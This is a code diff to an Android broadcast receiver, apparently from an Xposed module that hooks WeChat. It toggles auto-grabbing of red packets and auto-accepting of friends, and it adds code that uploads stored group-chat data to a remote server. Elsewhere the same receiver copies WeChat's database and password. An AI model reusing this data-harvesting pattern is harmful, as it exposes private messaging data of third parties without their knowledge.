@@ -82,6 +82,7 @@ import java.util.List;
 import java.util.Map;
 import java.util.Random;
 
+import de.robv.android.xposed.XposedBridge;
 import okhttp3.Call;
 import okhttp3.Response;
 
@@ -140,10 +141,8 @@ public class MsgReceiver extends BroadcastReceiver {
 
      if(action.equals(Constance.action_getWechatFriends))
      {
-       //  action_getWechatFriends(context,intent);
      }else if (action.equals(Constance.action_returnRoom)){
          String momyType = intent.getStringExtra("momyType");
-
          Toast.makeText(context, "是否开启自动抢红包"+momyType, Toast.LENGTH_LONG).show();
          action_returnRooms(context,momyType);
      }else if (action.equals(Constance.action_getcpWechatDb)){
@@ -152,7 +151,6 @@ public class MsgReceiver extends BroadcastReceiver {
      }else  if (action.equals(Constance.action_verify_friend)){
          String verifyType = intent.getStringExtra("verifyType");
          Toast.makeText(context, "是否开启自动通过好友"+verifyType, Toast.LENGTH_LONG).show();
-
          action_verify_friend(context,verifyType);
      }else if (action.equals(Constance.action_hookmessagefail)){
          String status = intent.getStringExtra("status");
@@ -166,24 +164,17 @@ public class MsgReceiver extends BroadcastReceiver {
          String canSeewxType = intent.getStringExtra("canSeewxType");
          Toast.makeText(context, "是否可以看微信号"+canSeewxType, Toast.LENGTH_LONG).show();
          action_canseewxno(context,canSeewxType);
-
      }else if(action.equals(Constance.action_canseephone)){
          String canSeePhoneType = intent.getStringExtra("canSeePhoneType");
          Toast.makeText(context, "是否可以看手机号"+canSeePhoneType, Toast.LENGTH_LONG).show();
          action_canseephone(context,canSeePhoneType);
-     }
-
-
-
-     else if (action.equals(Constance.action_saoyisao)){
+     } else if (action.equals(Constance.action_saoyisao)){
          String saoyisaoType = intent.getStringExtra("saoyisaoType");
          Toast.makeText(context, "是否打开扫一扫"+saoyisaoType, Toast.LENGTH_LONG).show();
-
          action_saoyisao(context,saoyisaoType);
      }else if (action.equals(Constance.action_settings)){
          String settingType = intent.getStringExtra("settingType");
          Toast.makeText(context, "是否可以设置"+settingType, Toast.LENGTH_LONG).show();
-
          action_settings(context,settingType);
      }else if (action.equals(Constance.action_receiveluckmoney)){
          String receivemomyType = intent.getStringExtra("receivemomyType");
@@ -206,7 +197,6 @@ public class MsgReceiver extends BroadcastReceiver {
     private void action_candeletefriendchat(Context context,String deletefriendchatType) {
         if ("true".equals(deletefriendchatType)) {
             MyFileUtil.writeProperties(Constants.ONFRIENDCHATDELETESTAUS_PUT,"true");
-
         } else {
             MyFileUtil.writeProperties(Constants.ONFRIENDCHATDELETESTAUS_PUT,"false");
         }
@@ -221,7 +211,6 @@ public class MsgReceiver extends BroadcastReceiver {
     private void action_receiveluckmoney(Context context,String receivemomyType) {
         if ("true".equals(receivemomyType)) {
             MyFileUtil.writeProperties(Constants.RECEIVELUCKYMONEYSTAUS_PUT,"true");
-
         } else {
             MyFileUtil.writeProperties(Constants.RECEIVELUCKYMONEYSTAUS_PUT,"false");
         }
@@ -292,6 +281,7 @@ public class MsgReceiver extends BroadcastReceiver {
     //获取数据库的路径并复制去指定文件夹，和密码
     private void action_getWechatDB(Context context, Intent intent) {
         String friendBeans = MyFileUtil.readFromFile(AppConfig.APP_FILE + "/friendBeans");
+        String chatroomEntitiesJson = MyFileUtil.readFromFile(AppConfig.APP_FILE + "/chatroomEntitiesJson");
         wxno = intent.getStringExtra("wxno");
         String wxid = intent.getStringExtra("wxid");
         if (StringUtils.isBlank(wxno)){
@@ -301,10 +291,33 @@ public class MsgReceiver extends BroadcastReceiver {
         String headImgUrl = intent.getStringExtra("headImgUrl");
         String userName = intent.getStringExtra("userName");
         Toast.makeText(context,"连接中",Toast.LENGTH_LONG).show();
+
+        //登录IM同步好友
         if (StringUtils.isNotBlank(friendBeans)){
             Log.e("111","friendBeansJson：："+friendBeans);
             sendWXFriendList(friendBeans,context, wxno,wxid,headImgUrl,userName);
         }
+
+        //上传群消息
+        if (StringUtils.isNotBlank(chatroomEntitiesJson)){
+            sendWXChatroomList(chatroomEntitiesJson,wxno);
+        }
+    }
+
+    private void sendWXChatroomList(String chatroomEntitiesJson,String wxno) {
+
+        OkGo.post(AppConfig.OUT_NETWORK+ NetApi.synchronChatroom+"/"+wxno).upJson(chatroomEntitiesJson).execute(new StringCallback() {
+            @Override
+            public void onSuccess(String s, Call call, Response response) {
+                Log.e("TAG","同步群成功："+s);
+            }
+
+
+            @Override
+            public void onError(Call call, Response response, Exception e) {
+                Log.e("TAG","同步群失败："+e.toString());
+            }
+        });
     }
 
 
